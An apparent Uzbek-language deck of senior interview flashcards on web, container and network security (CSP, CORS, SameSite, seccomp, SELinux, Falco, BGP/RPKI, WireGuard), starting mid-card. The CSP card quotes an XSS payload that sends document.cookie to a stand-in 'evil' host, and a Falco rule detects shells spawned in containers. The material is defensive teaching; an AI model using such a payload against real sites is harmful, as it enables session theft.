always;</pre><p>Bosqichma-bosqich joriy qiling:</p><pre>max-age=300            # 5 daqiqa, sinov<br>max-age=86400; includeSubDomains<br>max-age=63072000; includeSubDomains; preload  -&gt; hstspreload.org ga yuborish</pre><pre>curl -sI https://example.com | grep -i strict</pre><p><b>Tuzoqlar:</b></p><ul><li><code>includeSubDomains</code> — HTTP'da ishlayotgan eski subdomain (<code>legacy.example.com</code>) ochilmay qoladi.</li><li>Preload'dan chiqish <b>oylab</b> davom etadi — ehtiyot bo'ling.</li><li>Header faqat HTTPS javobida ishlaydi; HTTP javobdagi HSTS e'tiborsiz qoldiriladi.</li></ul><p><b>Senior nuqta:</b> HSTS — TLS'ni majburiy qilishning eng arzon usuli. Avval barcha subdomain'lar HTTPS'da ekanini inventarizatsiya qiling, keyin preload.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41932	<p>Content Security Policy (CSP) nima?</p>	<p><b>Qisqa javob:</b> CSP (Content Security Policy) — brauzerga sahifa qaysi manbalardan skript, stil, rasm, iframe yuklashi va qayerga ulanishi mumkinligini aytuvchi HTTP header. XSS bo'lsa ham kiritilgan skript bajarilmaydi — bu <b>defense in depth</b>.</p><p><b>Muammo:</b> Kodda bitta escape qilinmagan joy bor: <code>&lt;div&gt;${comment}&lt;/div&gt;</code>. Hujumchi <code>&lt;script&gt;fetch('//evil/?c='+document.cookie)&lt;/script&gt;</code> kiritadi. Output encoding asosiy himoya, lekin xato bo'lganda CSP skriptni bloklaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>Response: Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'<br>HTML: &lt;script nonce=&quot;r4nd0m&quot; src=&quot;/app.js&quot;&gt;&lt;/script&gt;    -&gt; ruxsat<br>      &lt;script&gt;alert(1)&lt;/script&gt; (hujumchi, nonce yo'q)  -&gt; BLOK + violation report</pre><p><b>Amalda (zamonaviy &quot;strict CSP&quot;):</b></p><pre>Content-Security-Policy:<br>  script-src 'nonce-{har-so'rovda-yangi}' 'strict-dynamic';<br>  object-src 'none';<br>  base-uri 'none';<br>  frame-ancestors 'self';<br>  report-to csp-endpoint</pre><p>Avval buzmasdan sinash:</p><pre>Content-Security-Policy-Report-Only: ...</pre><p>Brauzer console'da: <code>Refused to execute inline script because it violates...</code></p><p><b>Tuzoqlar:</b></p><ul><li><code>'unsafe-inline'</code> yoki <code>script-src *</code> — CSP'ni deyarli foydasiz qiladi.</li><li>Domen allowlist (<code>script-src cdn.jsdelivr.net</code>) — o'sha CDN'dagi istalgan kutubxona (JSONP, eski Angular) orqali bypass mumkin. Nonce/hash yaxshiroq.</li><li>Nonce statik bo'lsa (cache'langan HTML) — himoya yo'q.</li></ul><p><b>Senior nuqta:</b> Eski ilovaga CSP'ni Report-Only bilan boshlab, violation'larni yig'ib, bosqichma-bosqich enforce qiling. <code>frame-ancestors</code> X-Frame-Options'ning zamonaviy o'rnini bosadi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41933	<p>CORS nima?</p>	<p><b>Qisqa javob:</b> CORS (Cross-Origin Resource Sharing) — brauzer Same-Origin Policy'ni <b>yumshatish</b> mexanizmi: server <code>Access-Control-Allow-Origin</code> kabi header'lar bilan boshqa origin'dagi JavaScript'ga javobni o'qishga ruxsat beradi. CORS server himoyasi emas — brauzer qoidasi; <code>curl</code> uni e'tiborsiz qoldiradi.</p><p><b>Muammo:</b> <code>app.example.com</code> dagi frontend <code>api.example.com</code> ga fetch qiladi — origin har xil, brauzer javobni bloklaydi. Developer &quot;tuzatish&quot; uchun <code>*</code> qo'yadi va xavf ochadi.</p><p><b>Qanday ishlaydi:</b></p><pre>Oddiy so'rov (GET, simple header): brauzer yuboradi, javobdagi ACAO'ni tekshiradi<br>Murakkab (PUT, JSON, Authorization):<br>  OPTIONS /orders  Origin: https://app.example.com<br>                   Access-Control-Request-Method: PUT<br>  &lt;- 204 Access-Control-Allow-Origin: https://app.example.com<br>         Access-Control-Allow-Methods: GET, PUT<br>         Access-Control-Max-Age: 600<br>  keyin haqiqiy PUT</pre><p><b>Amalda:</b></p><pre>set $cors &quot;&quot;;<br>if ($http_origin ~* ^https://(app|admin)\.example\.com$) { set $cors $http_origin; }<br>add_header Access-Control-Allow-Origin $cors always;<br>add_header Access-Control-Allow-Credentials true always;<br>add_header Vary Origin always;</pre><pre>curl -si -X OPTIONS https://api.example.com/orders \<br>  -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: PUT' | grep -i access-control</pre><p><b>Tuzoqlar:</b></p><ul><li><code>Origin</code>'ni tekshirmasdan aks ettirish + <code>Allow-Credentials: true</code> — istalgan sayt foydalanuvchi sessiyasi bilan API'ni o'qiydi.</li><li><code>*</code> va credential'lar birga ishlamaydi (brauzer rad etadi).</li><li>Regex xatosi: <code>example.com$</code> -&gt; <code>evilexample.com</code> ham o'tadi.</li><li><code>Vary: Origin</code> yo'q — CDN boshqa origin header'ini cache'lab beradi.</li></ul><p><b>Senior nuqta:</b> CORS CSRF'dan himoya qilmaydi (simple POST baribir yuboriladi). Authz serverda bo'lishi kerak; CORS faqat &quot;brauzer JS javobni o'qiy oladimi&quot;ni boshqaradi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41934	<p>SameSite cookie atributi (<code>Strict</code>, <code>Lax</code>, <code>None</code>) nima?</p>	<p><b>Qisqa javob:</b> <code>SameSite</code> — cookie cross-site so'rov bilan yuborilishini boshqaradi: | Qiymat | Cross-site'da yuboriladimi | |---|---| | <code>Strict</code> | Hech qachon (hatto link bosilganda ham) | | <code>Lax</code> | Faqat top-level GET navigatsiya (link bosish) | | <code>None</code> | Har doim — <code>Secure</code> bilan majburiy | Atribut yo'q bo'lsa Chrome <code>Lax</code> deb hisoblaydi.</p><p><b>Muammo:</b> CSRF — <code>evil.com</code> sahifasidagi yashirin forma <code>bank.com/transfer</code> ga POST qiladi, brauzer bank cookie'sini o'zi qo'shadi. SameSite brauzer darajasida bu cookie'ni qo'shmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>&quot;Site&quot; = eTLD+1 (a.example.com va b.example.com — bir site!)<br>evil.com --POST form--&gt; bank.com    Lax: cookie YO'Q   Strict: YO'Q<br>evil.com --&lt;a href&gt;---&gt; bank.com    Lax: cookie BOR    Strict: YO'Q<br>evil.com --&lt;img&gt;/fetch-&gt; bank.com   Lax: YO'Q          None: BOR</pre><p><b>Amalda:</b></p><pre>Set-Cookie: session=abc; Path=/; Secure; HttpOnly; SameSite=Lax<br>Set-Cookie: __Host-csrf=xyz; Path=/; Secure; SameSite=Strict<br>Set-Cookie: widget=1; Secure; SameSite=None; Partitioned   # 3rd-party embed</pre><p>DevTools &gt; Application &gt; Cookies — SameSite ustuni; bloklanganlari Network tab'da sariq belgi bilan.</p><p><b>Tuzoqlar:</b></p><ul><li>SameSite <b>subdomain'lardan</b> himoya qilmaydi — buzilgan <code>blog.example.com</code> <code>app.example.com</code> ga same-site so'rov yuboradi.</li><li><code>Lax</code> bilan GET so'rovida holat o'zgartirish (<code>GET /delete?id=1</code>) baribir zaif.</li><li>OAuth/SAML callback'lari (cross-site POST) <code>Strict</code>/<code>Lax</code> bilan buziladi — <code>None</code> kerak bo'lishi mumkin.</li></ul><p><b>Senior nuqta:</b> SameSite — qo'shimcha qatlam; sezgir amallar uchun CSRF token yoki <code>Origin</code> header tekshiruvi baribir kerak. Sessiya cookie'si uchun standart: <code>Secure; HttpOnly; SameSite=Lax</code> va <code>__Host-</code> prefiksi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41935	<p>Container'larda capability'larni olib tashlash nima?</p>	<p><b>Qisqa javob:</b> Linux root huquqi ~40 ta alohida <b>capability</b>ga bo'lingan (<code>CAP_NET_ADMIN</code>, <code>CAP_SYS_ADMIN</code>, ...). Container'da <code>--cap-drop=ALL</code> qilib, faqat kerakli bittasini (<code>NET_BIND_SERVICE</code>) qaytarish — container ichidagi root'ning kuchini keskin kamaytiradi.</p><p><b>Muammo:</b> Docker default'da ~14 ta capability beradi (<code>CHOWN</code>, <code>SETUID</code>, <code>NET_RAW</code>, ...). <code>NET_RAW</code> bilan ARP spoofing qilish mumkin; <code>SYS_ADMIN</code> deyarli to'liq root — container escape uchun asosiy vosita.</p><p><b>Qanday ishlaydi:</b></p><pre>Kernel tekshiruvi:  bind(80)? -&gt; process CAP_NET_BIND_SERVICE'ga egami?<br>                    mount()?  -&gt; CAP_SYS_ADMIN bormi?<br>Capability to'plamlari: Permitted, Effective, Inheritable, Bounding, Ambient<br>cap-drop -&gt; Bounding set'dan olib tashlanadi -&gt; hatto setuid binary ham qaytarolmaydi</pre><p><b>Amalda:</b></p><pre>docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE nginx<br>docker run --rm alpine sh -c 'apk add -q libcap; capsh --print'   # default to'plam<br>grep Cap /proc/1/status ; capsh --decode=00000000a80425fb</pre><p>Kubernetes:</p><pre>securityContext:<br>  runAsNonRoot: true<br>  allowPrivilegeEscalation: false<br>  capabilities:<br>    drop: [&quot;ALL&quot;]<br>    add: [&quot;NET_BIND_SERVICE&quot;]</pre><p><b>Tuzoqlar:</b></p><ul><li><code>privileged: true</code> barcha capability'larni beradi va drop'ni bekor qiladi.</li><li>Non-root user bilan <code>add</code> qilingan capability effective bo'lmasligi mumkin (ambient muammosi) — oson yo'l: ilovani 8080 portda ishlatish.</li><li><code>ping</code> <code>NET_RAW</code> talab qiladi — drop'dan keyin buziladi (yangi kernel'larda <code>net.ipv4.ping_group_range</code> yechim).</li></ul><p><b>Senior nuqta:</b> Pod Security Standards <code>restricted</code> profili <code>drop: ALL</code> ni talab qiladi. Default qiling — istisno uchun hujjatlashtirilgan sabab so'rang.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41936	<p>Seccomp BPF filtri (xavfsizlik kontekstida) nima?</p>	<p><b>Qisqa javob:</b> Seccomp (secure computing mode) BPF filtri — process qaysi <b>syscall</b>larni qanday argument bilan chaqira olishini kernel darajasida cheklaydi. Taqiqlangan syscall'ga <code>EPERM</code> qaytadi yoki process o'ldiriladi. Container'lar kernel bilan to'g'ridan-to'g'ri gaplashgani uchun bu hujum yuzasini qisqartiradi.</p><p><b>Muammo:</b> Linux'da ~400+ syscall bor, oddiy web ilova ~60-80 tasini ishlatadi. Qolganlari (<code>keyctl</code>, <code>unshare</code>, <code>ptrace</code>, <code>bpf</code>) faqat exploit uchun foydali — ko'p kernel CVE'lari aynan kam ishlatiladigan syscall'larda.</p><p><b>Qanday ishlaydi:</b></p><pre>process --syscall(nr, args)--&gt; seccomp BPF dasturi (kernel'da)<br>                                 |-- allow  -&gt; davom<br>                                 |-- errno  -&gt; EPERM<br>                                 |-- kill   -&gt; SIGSYS<br>                                 `-- log / notify (userspace agent'ga)</pre><p><b>Amalda:</b></p><pre>docker run --rm alpine grep Seccomp /proc/1/status   # 2 = filter faol<br>docker run --security-opt seccomp=profile.json app</pre><pre>{ &quot;defaultAction&quot;: &quot;SCMP_ACT_ERRNO&quot;,<br>  &quot;architectures&quot;: [&quot;SCMP_ARCH_X86_64&quot;],<br>  &quot;syscalls&quot;: [{ &quot;names&quot;: [&quot;read&quot;,&quot;write&quot;,&quot;openat&quot;,&quot;close&quot;,&quot;epoll_wait&quot;,&quot;futex&quot;],<br>                 &quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot; }] }</pre><p>Kubernetes (default K8s seccomp'siz ishlaydi — yoqing):</p><pre>securityContext:<br>  seccompProfile:<br>    type: RuntimeDefault</pre><p><b>Tuzoqlar:</b></p><ul><li>Kubernetes'da <code>RuntimeDefault</code> avtomatik emas (kubelet <code>--seccomp-default</code> flag'i bilan yoqiladi).</li><li>Qo'lda allowlist yozish — glibc yangilanishi yangi syscall (<code>clone3</code>) qo'shsa ilova sinadi. Profillarni Inspektor Gadget / Security Profiles Operator bilan yozib oling.</li><li><code>Unconfined</code> debugging'dan keyin qolib ketadi.</li></ul><p><b>Senior nuqta:</b> <code>RuntimeDefault</code> — narxi deyarli nol, qiymati yuqori: barcha klasterlarda default qiling, custom profilni faqat yuqori xavfli workload'larga.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41937	<p>Docker uchun AppArmor profili nima?</p>	<p><b>Qisqa javob:</b> AppArmor — Linux Security Module (LSM): process'ga <b>fayl yo'llari</b>, capability, tarmoq, mount bo'yicha ruxsatlar profilini biriktiradi. Docker har container'ga avtomatik <code>docker-default</code> profilini qo'llaydi (Ubuntu/Debian'da).</p><p><b>Muammo:</b> Container root bo'lsa va escape imkoniyati bo'lsa, <code>/proc/sysrq-trigger</code>, <code>/sys/kernel</code> kabi joylarga yozish xost'ni buzadi. AppArmor bu yo'llarni root uchun ham yopadi (MAC — mandatory).</p><p><b>Qanday ishlaydi:</b></p><pre>process open(&quot;/proc/sys/kernel/x&quot;, W)<br>   v<br>DAC (rwx, uid) ok?  -&gt; ha<br>   v<br>AppArmor profil: deny /proc/sys/** w  -&gt; EACCES (+ audit log)</pre><p><code>docker-default</code> taqiqlaydi: <code>mount</code>, <code>/proc/sys</code>, <code>/sys</code> ga yozish, <code>ptrace</code> boshqa profilga.</p><p><b>Amalda:</b></p><pre>aa-status                                   # yuklangan profillar<br>docker inspect -f '{{.AppArmorProfile}}' app   # docker-default<br>cat /proc/1/attr/current                    # container ichida</pre><p>Custom profil:</p><pre>#include &lt;tunables/global&gt;<br>profile web-app flags=(attach_disconnected) {<br>  #include &lt;abstractions/base&gt;<br>  network inet tcp,<br>  /app/** r,<br>  /tmp/** rw,<br>  deny /etc/shadow r,<br>  deny mount,<br>}</pre><pre>apparmor_parser -r /etc/apparmor.d/web-app<br>docker run --security-opt apparmor=web-app app</pre><p>K8s 1.30+: <code>securityContext.appArmorProfile.type: RuntimeDefault | Localhost</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Profil har <b>node</b>'da yuklangan bo'lishi kerak — yo'q bo'lsa pod start bo'lmaydi.</li><li>RHEL/Fedora'da AppArmor yo'q — u yerda SELinux.</li><li><code>complain</code> rejimida faqat log yoziladi, bloklanmaydi — test'dan keyin <code>enforce</code>'ga o'tishni unutish.</li></ul><p><b>Senior nuqta:</b> AppArmor yo'lga asoslangan — o'qish oson, lekin hardlink/bind mount bilan chetlab o'tish mumkin. Odatda <code>docker-default</code> + seccomp + cap-drop yetarli; custom profil faqat yuqori xavfli servislar uchun.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41938	<p>SELinux Mandatory Access Control nima?</p>	<p><b>Qisqa javob:</b> SELinux — label (kontekst) asosidagi Mandatory Access Control: har process va faylda <code>user:role:type:level</code> label bor, kernel siyosat bo'yicha <b>type</b> juftligi uchun ruxsatni tekshiradi — root bo'lsa ham. Container'lar <code>container_t</code> type va noyob <b>MCS kategoriyalari</b> (<code>s0:c123,c456</code>) bilan bir-biridan ajratiladi.</p><p><b>Muammo:</b> Ikki container bir xil UID 0 bilan ishlaydi. Biri escape qilib xost'ga chiqsa, ikkinchi container fayllarini o'qiy oladi. DAC (uid) bu yerda yordam bermaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>Container A: system_u:system_r:container_t:s0:c1,c2<br>Container B: system_u:system_r:container_t:s0:c3,c4<br>Fayl B:      system_u:object_r:container_file_t:s0:c3,c4<br>A -&gt; fayl B o'qish?  type ruxsat bor, lekin MCS c1,c2 != c3,c4 -&gt; DENY (AVC)<br>A -&gt; /etc/shadow (shadow_t)? container_t -&gt; shadow_t qoida yo'q -&gt; DENY</pre><p><b>Amalda:</b></p><pre>getenforce                      # Enforcing<br>ps -eZ | grep container_t<br>ls -Z /var/lib/containers<br>ausearch -m AVC -ts recent      # rad etishlar<br>audit2why &lt; /var/log/audit/audit.log<br># volume'ni container uchun qayta label'lash<br>podman run -v /data:/data:Z app   # Z = shaxsiy label, z = umumiy</pre><p><b>Tuzoqlar:</b></p><ul><li>Muammo chiqsa <code>setenforce 0</code> qilish — butun himoyani o'chiradi. To'g'ri yo'l: AVC'ni o'qish, <code>:Z</code>, boolean (<code>setsebool</code>) yoki kichik policy modul.</li><li><code>:Z</code> ni <code>/home</code> yoki <code>/</code> ga qo'llash — xost label'lari buziladi.</li><li><code>privileged</code> container <code>spc_t</code> (super privileged) bo'lib SELinux'dan chiqadi.</li></ul><p><b>Senior nuqta:</b> RHEL/OpenShift'da SELinux CVE-2019-5736 (runc) kabi ko'p container escape'larni bloklagan. Uni o'chirmaslik madaniyati — eng arzon xavfsizlik investitsiyasi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41939	<p>Falco qoida sintaksisi qanday?</p>	<p><b>Qisqa javob:</b> Falco qoidasi — YAML'dagi deklarativ blok: <code>condition</code> (syscall/K8s audit event'lari ustidagi filtr ifodasi), <code>output</code> (alert matni, <code>%field</code> bilan), <code>priority</code>. Qoidalar <code>macro</code> va <code>list</code> bilan qayta ishlatiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>kernel syscall (execve, openat, connect) --eBPF probe--&gt; Falco engine<br>   -&gt; har event uchun qoida condition'lari baholanadi<br>   -&gt; mos kelsa -&gt; output formatlanadi -&gt; stdout / gRPC / Falcosidekick</pre><p><b>Amalda (to'liq misol):</b></p><pre>- list: shell_binaries<br>  items: [bash, sh, zsh, dash, ash]<br><br>- macro: in_prod_ns<br>  condition: k8s.ns.name in (prod, payments)<br><br>- rule: Shell in production container<br>  desc: Prod container ichida interaktiv shell ochildi<br>  condition: &gt;<br>    spawned_process and container<br>    and proc.name in (shell_binaries)<br>    and proc.tty != 0<br>    and in_prod_ns<br>  output: &gt;<br>    Shell ochildi (user=%user.name cmd=%proc.cmdline<br>    pod=%k8s.pod.name ns=%k8s.ns.name image=%container.image.repository)<br>  priority: WARNING<br>  tags: [container, shell, mitre_execution]<br><br>- rule: Shell in production container      # mavjud qoidani kengaytirish<br>  condition: and not proc.pname = &quot;healthcheck.sh&quot;<br>  override:<br>    condition: append</pre><pre>falco -r my_rules.yaml --dry-run   # sintaksis tekshirish<br>falco -L                           # qoidalar ro'yxati</pre><p><b>Asosiy maydonlar:</b> <code>evt.type</code>, <code>proc.name</code>, <code>proc.cmdline</code>, <code>proc.pname</code>, <code>fd.name</code>, <code>fd.sip</code>, <code>user.name</code>, <code>container.id</code>, <code>k8s.pod.name</code>. Operatorlar: <code>=</code>, <code>in</code>, <code>contains</code>, <code>startswith</code>, <code>pmatch</code>, <code>and/or/not</code>.</p><p><b>Tuzoqlar:</b></p><ul><li><code>condition</code> boshida <code>evt.type</code> filtri bo'lmasa — har syscall uchun baholanadi, CPU qimmat.</li><li>Default qoidalarni tahrirlash — upgrade'da yo'qoladi. <code>override</code>/<code>append</code> ishlating, alohida faylda.</li><li>Shovqinli qoida (CI pod'lari shell ochadi) — alert fatigue. Avval <code>priority: NOTICE</code>, istisnolar, keyin kuchaytirish.</li></ul><p><b>Senior nuqta:</b> Qoidalarni kod kabi yuriting: git'da, test (event-generator bilan), review. Har qoida MITRE ATT&amp;CK teg'i va runbook havolasiga ega bo'lsin.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41940	<p>BGP route hijacking nima?</p>	<p><b>Qisqa javob:</b> BGP hijacking — AS (Autonomous System) o'ziga tegishli bo'lmagan IP prefiksni BGP orqali e'lon qilib, internet trafikni o'ziga tortadi: tinglaydi, o'zgartiradi yoki &quot;qora tuynuk&quot;ka tashlaydi. BGP standart holatda e'lonlarni tekshirmaydi — ishonchga asoslangan.</p><p><b>Muammo (real holatlar):</b> 2008 Pakistan Telecom YouTube'ning prefiksini e'lon qildi — YouTube dunyo bo'ylab 2 soat o'chdi. 2018 MyEtherWallet: Amazon Route 53 prefiksi hijack qilinib, DNS soxtalashtirildi va kripto o'g'irlandi.</p><p><b>Qanday ishlaydi:</b></p><pre>Haqiqiy:   AS15169 e'lon: 8.8.8.0/24<br>Hujumchi:  AS666   e'lon: 8.8.8.0/25 va 8.8.8.128/25   (aniqroq prefiks)<br>Router'lar: longest prefix match -&gt; /25 yutadi -&gt; trafik AS666 ga<br>Turlari: exact-prefix (yaqin router'lar ishonadi), more-specific (global), route leak (xato)</pre><p><b>Himoya:</b></p><ul><li><b>RPKI ROV</b> — prefiks egasi ROA bilan &quot;faqat AS X, max /24&quot; deb imzolaydi; router'lar invalid'ni tashlaydi.</li><li>Prefiks filtrlari (IRR asosida) peer'lar uchun, max-prefix limit.</li><li>O'z prefikslaringizni <code>/24</code> gacha e'lon qilish (more-specific hijack'ni qiyinlashtiradi).</li><li>Monitoring: BGPalerter, Cloudflare Radar, RIPE RIS.</li></ul><p><b>Amalda:</b></p><pre># prefiksingiz RPKI holati<br>curl -s &quot;https://stat.ripe.net/data/rpki-validation/data.json?resource=AS13335&amp;prefix=1.1.1.0/24&quot; | jq .data.status<br>whois -h whois.radb.net -- '-i origin AS13335' | grep route</pre><p><b>Tuzoqlar:</b></p><ul><li>ROA'da <code>maxLength</code> keng (<code>/16</code> uchun max <code>/24</code>) — hujumchi o'z AS'ingizni origin qilib /24 e'lon qilsa (forged-origin) ROV o'tkazadi.</li><li>RPKI faqat <b>origin</b>'ni tekshiradi, yo'lni emas (ASPA/BGPsec rivojlanmoqda).</li><li>TLS bo'lsa ham hijack DNS orqali sertifikat chiqarishga (domain validation) imkon berishi mumkin.</li></ul><p><b>Senior nuqta:</b> Agar kompaniyangiz o'z IP blokiga ega bo'lsa — ROA yaratish 15 daqiqalik ish va eng katta ta'sirga ega qadam. Prefikslaringizni BGP monitoring'ga ulang.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41941	<p>RPKI nima?</p>	<p><b>Qisqa javob:</b> RPKI (Resource Public Key Infrastructure) — RIR'lar (RIPE, ARIN, APNIC) sertifikat ierarxiyasi orqali IP prefiks egasi <b>ROA</b> (Route Origin Authorization) imzolaydi: &quot;bu prefiksni faqat AS X, maksimal /Y uzunlikda e'lon qilishi mumkin&quot;. Router'lar e'lonlarni shu bilan tekshiradi (ROV — Route Origin Validation).</p><p><b>Qanday ishlaydi:</b></p><pre>IANA -&gt; RIR (RIPE) -&gt; LIR (sizning kompaniya) sertifikati<br>                          |<br>                       ROA: 203.0.113.0/24, origin AS64500, maxLength 24<br>                          v<br>RPKI repository'lar (rsync/RRDP)<br>                          v<br>Validator (Routinator, rpki-client, Fort) -&gt; VRP ro'yxati<br>                          v  RTR protokoli<br>Router: BGP e'lon keldi 203.0.113.0/24 origin AS666<br>   -&gt; Valid / Invalid / NotFound  -&gt; Invalid'ni drop</pre><p><b>Amalda:</b></p><pre># validator ishga tushirish<br>docker run -d -p 3323:3323 -p 8323:8323 nlnetlabs/routinator<br>curl -s localhost:8323/api/v1/validity/AS64500/203.0.113.0/24 | jq .validated_route.validity.state</pre><p>Router (Juniper/Cisco) misoli g'oyasi:</p><pre>router bgp 64500<br> bgp rpki server tcp 10.0.0.5 port 3323 refresh 600<br> route-map RPKI deny 10<br>  match rpki invalid</pre><p>ROA yaratish — RIR portalida (RIPE &quot;RPKI Dashboard&quot;) bir necha klik.</p><p><b>Tuzoqlar:</b></p><ul><li>ROA'ni noto'g'ri yaratish (origin AS xato) — o'z prefiksingiz <b>Invalid</b> bo'lib, ROV qiluvchi tarmoqlarda yo'qoladi. Avval tekshiring.</li><li>CDN/DDoS himoya provayderi sizning prefiksingizni e'lon qilsa — ularning AS'i uchun ham ROA kerak.</li><li><code>maxLength</code>ni keraksiz katta qilish — forged-origin hijack'ga eshik.</li></ul><p><b>Senior nuqta:</b> 2025 holatida global route'larning yarmidan ko'pi ROA bilan qoplangan, katta tranzit provayderlar Invalid'ni tashlaydi. RPKI — origin himoyasi; path himoyasi uchun ASPA keladi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41942	<p>Cloudflare'da Anycast BGP routing qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> Anycast — bir xil IP prefiks (masalan <code>1.1.1.0/24</code>) dunyo bo'ylab yuzlab data center'dan BGP orqali <b>bir vaqtda</b> e'lon qilinadi. Internet router'lari BGP qoidalari bo'yicha eng qisqa yo'lni tanlaydi, shuning uchun client avtomatik eng yaqin (topologik) edge'ga tushadi.</p><p><b>Muammo:</b> Unicast'da bitta IP — bitta joy: uzoq foydalanuvchiga yuqori latency, DDoS hammasi bitta joyga uriladi, failover uchun DNS o'zgartirish (TTL kutish) kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>            1.1.1.0/24 e'lon        1.1.1.0/24 e'lon        1.1.1.0/24 e'lon<br>          [Frankfurt DC]           [Toshkent DC]           [Singapur DC]<br>                 \                       |                       /<br>                  +------ Internet (BGP: eng qisqa AS-path) ----+<br>Toshkentdagi client -&gt; Toshkent DC     Berlindagi -&gt; Frankfurt<br>Botnet 100 Gbps -&gt; har mintaqadagi ulushi o'sha DC'ga -&gt; taqsimlanadi<br>DC o'chsa -&gt; e'lonni qaytarib oladi -&gt; trafik keyingi yaqiniga (sekundlarda)</pre><p><b>Amalda:</b></p><pre>dig +short CHAOS TXT id.server @1.1.1.1      # qaysi PoP javob berdi<br>curl -s https://1.1.1.1/cdn-cgi/trace | grep colo<br>traceroute 1.1.1.1                           # bir necha hop'da tugaydi</pre><p><b>Tuzoqlar:</b></p><ul><li>&quot;Eng yaqin&quot; = BGP bo'yicha, geografik emas — ba'zan Toshkent trafigi Frankfurtga ketadi (peering siyosati).</li><li>TCP uchun xavf: marshrut sessiya o'rtasida o'zgarsa ulanish boshqa PoP'ga tushib uziladi. Amalda kam, lekin uzun ulanishlarda ehtimoli bor — Cloudflare ichki tunnel/consistent hashing bilan yumshatadi.</li><li>Debug qiyin: har foydalanuvchi boshqa server ko'radi.</li></ul><p><b>Senior nuqta:</b> Anycast DDoS'ni &quot;yutish&quot; emas, <b>bo'lish</b> strategiyasi: hujum hajmi butun tarmoq sig'imiga bo'linadi. DNS va UDP xizmatlari uchun ideal; stateful xizmatlar uchun L4 load balancer qatlamini qo'shish kerak.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41943	<p>WireGuard nima?</p>	<p><b>Qisqa javob:</b> WireGuard — Linux kernel'da (5.6+) ishlaydigan zamonaviy VPN protokoli. Kriptografiya qat'iy belgilangan (Curve25519, ChaCha20-Poly1305, BLAKE2s, Noise IK handshake), kodi ~4000 qator — IPsec/OpenVPN'dan ancha sodda, tez va audit qilish oson.</p><p><b>Muammo:</b> OpenVPN userspace'da — sekin; IPsec konfiguratsiyasi murakkab (cipher kelishuvi, ko'p rejim) va xato sozlash oson. &quot;Crypto agility&quot; — downgrade hujumlariga eshik.</p><p><b>Qanday ishlaydi:</b></p><pre>Har peer = public key. &quot;Cryptokey routing&quot;:<br>  peer A pubkey -&gt; AllowedIPs 10.0.0.2/32<br>Chiquvchi paket: dst 10.0.0.2 -&gt; qaysi peer? -&gt; shifrlash -&gt; UDP 51820<br>Kiruvchi: shifrni ochish -&gt; src IP shu peer'ning AllowedIPs'idami? yo'q -&gt; drop<br>Handshake 1-RTT, kalitlar har 2 daqiqada yangilanadi (PFS)<br>Javob bermaydi noma'lum paketlarga -&gt; port skanerda &quot;yashirin&quot;</pre><p><b>Amalda:</b></p><pre>wg genkey | tee priv | wg pubkey &gt; pub</pre><pre># /etc/wireguard/wg0.conf (server)<br>[Interface]<br>Address = 10.0.0.1/24<br>ListenPort = 51820<br>PrivateKey = &lt;server priv&gt;<br><br>[Peer]<br>PublicKey = &lt;client pub&gt;<br>AllowedIPs = 10.0.0.2/32</pre><pre>wg-quick up wg0<br>wg show          # latest handshake, transfer — tirikligini ko'rsatadi</pre><p>Client tarafda NAT ortida bo'lsa <code>PersistentKeepalive = 25</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Identity yo'q — faqat kalit; foydalanuvchi boshqaruvi, SSO, kalit revoke uchun ustki qatlam kerak (Tailscale, Netbird, Headscale).</li><li>Statik IP ajratish — katta flotda qo'lda boshqarib bo'lmaydi.</li><li>UDP bloklangan tarmoqlarda (korporativ Wi-Fi) ishlamaydi — TCP fallback yo'q.</li></ul><p><b>Senior nuqta:</b> Site-to-site va mesh VPN uchun WireGuard default tanlov. Lekin &quot;VPN = ishonchli tarmoq&quot; modelining o'zi eskirmoqda — ilova darajasidagi zero-trust access bilan birga ko'ring.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
